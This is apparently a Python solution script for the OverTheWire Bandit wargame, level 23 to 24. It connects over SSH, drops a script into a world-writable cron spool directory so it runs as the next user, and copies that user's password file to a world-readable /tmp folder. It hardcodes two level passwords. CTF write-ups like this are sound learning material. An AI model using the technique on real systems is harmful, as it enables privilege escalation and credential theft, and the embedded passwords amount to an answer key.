import os
import sys
sys.path.insert(1, os.path.dirname(os.path.realpath(__file__)) + '/..')

import paramiko
import utils
import time
from tqdm import tqdm

USERNAME = 'bandit23'
PASSWORD = 'jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print('connecting...\n')
client.connect(hostname=utils.ADDRESS, port=utils.PORT, username=USERNAME, password=PASSWORD)

print('ls -l /etc/cron.d/')
_, stdout, _ = client.exec_command('ls -l /etc/cron.d/')
utils.print_stdout(stdout)

print('cat /etc/cron.d/cronjob_bandit24')
# note that according to https://crontab.guru/#*_*_*_*_*
"""
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
"""
# the cronjob is executed every minute
_, stdout, _ = client.exec_command('cat /etc/cron.d/cronjob_bandit24')
utils.print_stdout(stdout)

print('cat /usr/bin/cronjob_bandit24.sh')
_, stdout, _ = client.exec_command('cat /usr/bin/cronjob_bandit24.sh')
utils.print_stdout(stdout)

# firstly, 
# cd /var/spool/$myname
# echo "Executing and deleting all scripts in /var/spool/$myname:"
# we can check in /var/spool that there exists bandit24 directory
# which allows anyone to write into and execute it
"""
bandit23@bandit:~$ ls -l /var/spool/
total 12
drwxrwx-wx 33 root bandit24 4096 Jul 21 13:13 bandit24
"""
# next, 
"""
if [ "$i" != "." -a "$i" != ".." ];
then
    echo "Handling $i"
    owner="$(stat --format "%U" ./$i)"
    if [ "${owner}" = "bandit23" ]; then
        timeout -s 9 60 ./$i
    fi
    rm -f ./$i
fi
"""
# it will execute each file inside of it, except current directory (.) and parent directory(..)
# if the owner of the file is bandit23, it will execute it for 60 seconds

# since we want to read bandit24 password in /etc/bandit_pass/bandit24
FOLDER_NAME = "temporaryfolderforbandit24"
BASH_SCRIPT = f"""#!/bin/bash
# create a temporary folder for storing the password file
mkdir /tmp/{FOLDER_NAME}
# allow anyone to access the folder
chmod 777 /tmp/{FOLDER_NAME}
# copy the password file and allow anyone to access it
cp /etc/bandit_pass/bandit24 /tmp/{FOLDER_NAME}/bandit24
chmod 777 /tmp/{FOLDER_NAME}/bandit24"""

# write the script and allow anyone to execute it
_, stdout, _ = client.exec_command(f'echo -e "{BASH_SCRIPT}" | tee /var/spool/bandit24/{FOLDER_NAME} && chmod 777 /var/spool/bandit24/{FOLDER_NAME}')
utils.print_stdout(stdout)

# wait for the cronjob to be executed
# 75 seconds because the cronjob is executed every 60s and we need to give it extra time for it to be executed
SLEEP_TIME = 75
print(f'sleeping for {SLEEP_TIME}s...')
for i in tqdm(range(SLEEP_TIME)):
    time.sleep(1)
print()

# read the password file
print(f'cat /tmp/{FOLDER_NAME}/bandit24')
_, stdout, _ = client.exec_command(f'cat /tmp/{FOLDER_NAME}/bandit24')
stdout = stdout.readlines()
utils.print_stdout(stdout)
password = utils.get_password(stdout)

# bandit24 password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
print(f"bandit24 password: {password}\n")

# clean up
print('deleting the temporary folder...')
client.exec_command(f'rm -r /tmp/{FOLDER_NAME}')

client.close()